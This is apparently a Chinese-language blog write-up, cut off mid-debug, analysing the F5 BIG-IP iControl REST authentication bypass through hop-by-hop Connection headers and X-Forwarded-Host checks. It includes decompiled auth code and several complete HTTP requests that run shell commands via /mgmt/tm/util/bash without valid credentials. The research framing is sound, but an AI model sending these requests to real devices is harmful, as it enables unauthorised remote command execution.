@@ -1,0 +1,190 @@
+## 概述
+官网5月5日漏洞通告：
+漏洞影响面：
+作为java初学者，尝试基于大佬们的文章稍微深入的分析了一下，因为能力不足，在分析过程中其实没有保留一个很严谨的思路和逻辑，反倒像自己一些疑问点的探析，可能有点乱，希望能给观者启发，同时求大佬们轻锤。
+## 分析
+根据我的上一篇文章对CVE-2021-22986的分析可知
+由于数据流是apache获取后根据url的模式将数据包转发给8100的jetty，针对F5 BIG-IP iControl REST
+API的认证绕过要过两关，分别是apache的认证以及jetty的认证。
+### apache认证验证逻辑
+在CVE-2021-22986影响版本中（我的是16.0.0），针对apache的认证绕过只要满足包头中存在X-F5-Auth-Token字段即可绕过，但是CVE-2021-22986修复版本（我使用的是16.1.2.1）中进行了修复，如果包头X-F5-Auth-Token参数为空则会直接返回401，如果不为空则依然可以转发至jetty。
+### jetty认证验证逻辑
+另外，在CVE-2021-22986影响版本中，jetty认证校验中只要求取包头X-F5-Auth-Token的值结果为null，同时Authorization头中username有效即可(admin为默认有效的username)，在CVE-2021-22986修复版本中，则首先会判断包头X-F5-Auth-Token的值结果是否为null，如果不是则使用包头X-F5-Auth-Token的值验证，如果为空则根据Authorization的值来进行判断。
+根据CVE-2021-22986修复版本（我使用的是16.1.2.1）中setIdentityFromBasicAuth可知
+    private static boolean setIdentityFromBasicAuth(final RestOperation request, final Runnable runnable) {
+        String authHeader = request.getBasicAuthorization();
+        if (authHeader == null) {
+            return false;
+        } else {
+            final BasicAuthComponents components = AuthzHelper.decodeBasicAuth(authHeader);
+            String xForwardedHostHeaderValue = request.getAdditionalHeader("X-Forwarded-Host");
+            if (xForwardedHostHeaderValue == null) {
+                request.setIdentityData(components.userName, (RestReference)null, (RestReference[])null);
+                if (runnable != null) {
+                    runnable.run();
+                }
+                return true;
+            } else {
+                String[] valueList = xForwardedHostHeaderValue.split(", ");
+                int valueIdx = valueList.length > 1 ? valueList.length - 1 : 0;
+                if (!valueList[valueIdx].contains("localhost") && !valueList[valueIdx].contains("127.0.0.1")) {
+                    if (valueList[valueIdx].contains("127.4.2.1") && components.userName.equals("f5hubblelcdadmin")) {
+                        request.setIdentityData(components.userName, (RestReference)null, (RestReference[])null);
+                        if (runnable != null) {
+                            runnable.run();
+                        }
+                        return true;
+                    } else {
+                        boolean isPasswordExpired = request.getAdditionalHeader("X-F5-New-Authtok-Reqd") != null && request.getAdditionalHeader("X-F5-New-Authtok-Reqd").equals("true");
+                        if (PasswordUtil.isPasswordReset() && !isPasswordExpired) {
+                            AuthProviderLoginState loginState = new AuthProviderLoginState();
+                            loginState.username = components.userName;
+                            loginState.password = components.password;
+                            loginState.address = request.getRemoteSender();
+                            RestRequestCompletion authCompletion = new RestRequestCompletion() {
+                                public void completed(RestOperation subRequest) {
+                                    request.setIdentityData(components.userName, (RestReference)null, (RestReference[])null);
+                                    if (runnable != null) {
+                                        runnable.run();
+                                    }
+                                }
+                                public void failed(Exception ex, RestOperation subRequest) {
+                                    RestOperationIdentifier.LOGGER.warningFmt("Failed to validate %s", new Object[]{ex.getMessage()});
+                                    if (ex.getMessage().contains("Password expired")) {
+                                        request.fail(new SecurityException(ForwarderPassThroughWorker.CHANGE_PASSWORD_NOTIFICATION));
+                                    }
+                                    if (runnable != null) {
+                                        runnable.run();
+                                    }
+                                }
+                            };
+                            try {
+                                RestOperation subRequest = RestOperation.create().setBody(loginState).setUri(UrlHelper.makeLocalUri(new URI(TMOS_AUTH_LOGIN_PROVIDER_WORKER_URI_PATH), (Integer)null)).setCompletion(authCompletion);
+                                RestRequestSender.sendPost(subRequest);
+                            } catch (URISyntaxException var11) {
+                                LOGGER.warningFmt("ERROR: URISyntaxEception %s", new Object[]{var11.getMessage()});
+                            }
+                            return true;
+                        } else {
+                            request.setIdentityData(components.userName, (RestReference)null, (RestReference[])null);
+                            if (runnable != null) {
+                                runnable.run();
+                            }
+                            return true;
+                        }
+                    }
+                } else {
+                    request.setIdentityData(components.userName, (RestReference)null, (RestReference[])null);
+                    if (runnable != null) {
+                        runnable.run();
+                    }
+                    return true;
+                }
+            }
+        }
+    }
+    static {
+        TMOS_AUTH_LOGIN_PROVIDER_WORKER_URI_PATH = TmosAuthProviderCollectionWorker.WORKER_URI_PATH + "/" + TmosAuthProviderCollectionWorker.generatePrimaryKey("tmos") + "/login";
+    }
+    }
+修复后的代码针对请求头的X-Forwarded-Host这个list中最后一个元素做了检查，如果是127.0.0.1，或者是127.4.2.1同时username是f5hubblelcdadmin,则依然可以通过认证，但是其他的请求则无法直接通过认证，会检查认证是否过期，如果过期则使用Authoriaztion头中的口令密码重新验证。
+### hop-by-hop
+根据[ **hop-by-hop headers**](https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers)
+据[RFC 2616](https://tools.ietf.org/html/rfc2616#section-13.5.1)，HTTP/1.1
+规范默认将以下标头视为逐跳：`Keep-Alive`、`Transfer-Encoding`、`TE`、`Connection`、`Trailer`、`Upgrade`和。当在请求中遇到这些标头时，兼容的代理应该处理或操作这些标头所指示的任何内容，而不是将它们转发到下一个跃点.
+**除了这些默认值之外，请求还可以定义一组自定义的标头，通过将它们添加到connection中来[逐跳处理](https://tools.ietf.org/html/rfc2616#section-14.10)，如下所示**
+    Connection: close, X-Foo, X-Bar
+这样子，不仅Connection不会呗转发到下一个跃点，而且其中定义的标头X-Foo、X-Bar也同样。参考以下示意图
+### 组合实现漏洞绕过
+一个有效的触发数据包是这样的
+    POST /mgmt/tm/util/bash HTTP/1.1
+    Host: 127.0.0.1
+    Authorization: Basic YWRtaW46
+    X-F5-Auth-Token: a
+    connection: X-F5-Auth-Token
+    Content-type: application/json
+    Content-Length: 41
+    {"command":"run", "utilCmdArgs": "-c id"}
+我们可以大胆猜测，在apache检查中，因为头部X-F5-Auth-Token存在值且不为空，所以成功绕过验证；
+在转发给jetty处理时根据hop-by-hop会将connection头以及X-F5-Auth-Token去掉转发；
+在jetty验证中，再次取X-F5-Auth-Token值为空，X-Forwarded-Host会将Host字段的值添加进来，检查结果为127.0.0.1，且Authoriaztion中username有效(admin)，因而认证通过。
+如果我们的猜测正确，那么发送以下数据包也应该成功(将Host
+ip设置为127.4.2.1，Authoriaztion的username设置为f5hubblelcdadmin)
+    POST /mgmt/tm/util/bash HTTP/1.1
+    Host: 127.4.2.1
+    Authorization: Basic ZjVodWJibGVsY2RhZG1pbjo=
+    X-F5-Auth-Token: a
+    Connection: X-F5-Auth-Token
+    Content-type: application/json
+    Content-Length: 41
+    {"command":"run", "utilCmdArgs": "-c id"}
+测试确实成功：
+并且如果在Host值为127.4.2.1的情况下将Authorization的username值设置为admin的话，则会失败，测试确实如所料
+## 调试
+为了验证猜想正确，进行调试分析
+调试开启步骤参考上一篇文章，即编辑`/var/service/restjavad/run`文件，加入
+    JVM_OPTIONS+=" -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8777"
+同时，防火墙开启8777端口
+    [root@localhost:NO LICENSE:Standalone] / # tmsh
+    root@(localhost)(cfg-sync Standalone)(NO LICENSE)(/Common)(tmos)# security firewall
+    root@(localhost)(cfg-sync Standalone)(NO LICENSE)(/Common)(tmos.security.firewall)# modify management-ip-rules rules add { allow-access-8777 { action accept destination { ports add { 8777 } } ip-protocol tcp place-before first } }
+然后使用idea连接远程调试即可
+断点直接下在RestServerServlet.class的service函数中即可，直接看apache传过来的request
+先发送一个可以触发漏洞的包：
+    POST /mgmt/tm/util/bash HTTP/1.1
+    Host: 127.0.0.1
+    Authorization: Basic YWRtaW46
+    X-F5-Auth-Token: a
+    Connection: X-F5-Auth-Token
+    Content-type: application/json
+    Content-Length: 41
+    {"command":"run", "utilCmdArgs": "-c id"}
+此时，在断点处获取到的op的值为
+    [
+     id=4255273
+     referer=null
+     uri=http://localhost:8100/mgmt/tm/util/bash
+     method=POST
+     statusCode=200
+     contentType=application/json
+     contentLength=41
+     contentRange=null
+     deadline=Tue May 24 12:16:12 PDT 2022
+     body=null
+     forceSocket=false
+     isResponse=false
+     retriesRemaining=5
+     coordinationId=null
+     isConnectionCloseRequested=false
+     isConnectionKeepAlive=true
+     isRestErrorResponseRequired=true
+     AdditionalHeadersAsString=
+      Request:   'Local-Ip-From-Httpd'='172.16.113.247'
+       'X-Forwarded-Proto'='http'
+       'X-Forwarded-Server'='localhost.localdomain'
+       'X-F5-New-Authtok-Reqd'='false'
+       'X-Forwarded-Host'='127.0.0.1'
+      Response:
+     ResponseHeadersTrace=
+     X-F5-Config-Api-Status=0]
+可以看到，X-Forwarded-Host的值就是我们果然传进入的host的值，因为基本上确定，apache在处理过程中将host头参数添加到X-Forwarded-Host参数中并传递给jetty,通过字符串匹配的方法，我们查找并确定时/etc/httpd/modules/mod_proxy.so在处理这个头
+可以看到，apache在处理过程中会调用mod_proxy.so，将Host的值添加到X-Forwarded-Host这个值当中，然后再传递给jetty，jetty又会根据X-Forwarded-Host的值来进行权限验证，整体流程基本清楚。
+但是这里我们看到，程序是使用了apr_table_mergen这个方法来将Host的值添加到X-Forwarded-Host当中，而不是使用apr_table_set这个方法直接设置，所以我们试想，如果在发送给apache的包中直接就包含有效的X-Forwarded-Host值会如何呢？
+测试发现失败的
+在断点处获得op的值为：
+    [
+     id=4260158
+     referer=null
+     uri=http://localhost:8100/mgmt/tm/util/bash
+     method=POST
+     statusCode=200
+     contentType=application/json
+     contentLength=41
+     contentRange=null
+     deadline=Tue May 24 12:40:23 PDT 2022
+     body=null
+     forceSocket=false
+     isResponse=false
+     retriesRemaining=5
+     coordinationId=null
+     isConnectionCloseRequested=false
